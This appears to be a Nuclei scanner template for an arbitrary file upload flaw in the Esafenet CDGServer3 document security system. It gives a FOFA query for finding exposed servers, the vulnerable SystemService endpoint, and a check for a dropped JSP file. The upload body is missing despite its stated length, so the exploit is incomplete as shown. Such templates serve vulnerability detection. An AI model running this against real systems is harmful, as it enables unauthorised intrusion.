id: esafenet-cdgserver3-SystemService-CDGXstreamDesers-fileupload
info:
  name: 亿赛通电子文档安全管理系统 SystemService - 任意文件上传
  author: leadlife
  severity: critical
  description: 
  reference: 
    - 
  metadata:
    verified: true
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: esafenet,fileupload

http:
  - raw:
      - |-
        POST /CDGServer3/SystemService?command=GETSYSTEMINFO HTTP/1.1
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
        Connection: close
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8
        Content-Type: text/xml
        Host: {{Hostname}}
        Content-Length: 4998

        
      
      - |+
        GET /CDGServer3/CDGXstreamDesers.jsp HTTP/1.1
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
        Connection: close
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'ksjldfio8978sahdkjfsdfjha'

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200